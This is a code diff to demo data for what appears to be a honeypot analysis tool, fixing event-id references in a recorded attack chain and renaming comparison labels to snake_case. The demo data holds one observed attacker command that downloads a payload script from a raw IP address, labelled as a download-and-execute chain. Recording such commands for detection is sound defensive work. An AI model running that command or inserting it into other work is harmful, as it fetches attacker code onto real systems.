@@ -1311,17 +1311,24 @@ const evaluationRunB: EvaluationRun = {
       ],
     },
   ],
+  // `cowrieEventId` must be an id `getEvent` can actually resolve, or the demo
+  // cannot exercise the one thing the evidence model exists for. Demo events are
+  // `${sessionId}-ev-${index}`; index 7 of SESSION-8F42A1 is the wget below.
   chainSteps: [
     {
+      id: "c1a2b3c4-d5e6-4f70-8a91-b2c3d4e5f601",
       chainId: "download-and-execute",
       stepIndex: 0,
       command: "wget http://31.44.185.9/payload.sh",
-      cowrieEventId: "EVT-8F42A1-0007",
+      cowrieEventId: "SESSION-8F42A1-ev-7",
       matchedRuleId: "rule-ingress-tool-transfer",
       expectedTechniqueId: "T1105",
       factStatus: "observed",
     },
     {
+      // The step never ran, so there is no event to cite — a null pointer here
+      // is honest, unlike an id that resolves to nothing.
+      id: "c1a2b3c4-d5e6-4f70-8a91-b2c3d4e5f602",
       chainId: "download-and-execute",
       stepIndex: 1,
       command: "ls -l payload.sh",
@@ -1405,10 +1412,12 @@ export const evaluationRunSummaries: EvaluationRunSummary[] = [
 export function compareEvaluationRuns(base: EvaluationRun, head: EvaluationRun): RunComparison {
   const differences: string[] = [];
   if (base.honeypotFingerprint !== head.honeypotFingerprint) {
-    differences.push("honeypotFingerprint");
+    // snake_case: these are VALUES in a string list, which CamelModel does not
+    // alias -- the backend appends exactly these (runs.py).
+    differences.push("honeypot_fingerprint");
   }
   if (base.evaluationConfigFingerprint !== head.evaluationConfigFingerprint) {
-    differences.push("evaluationConfigFingerprint");
+    differences.push("evaluation_config_fingerprint");
   }
   const deltas: Record<string, number | null> = {};
   const characteristics = new Set([
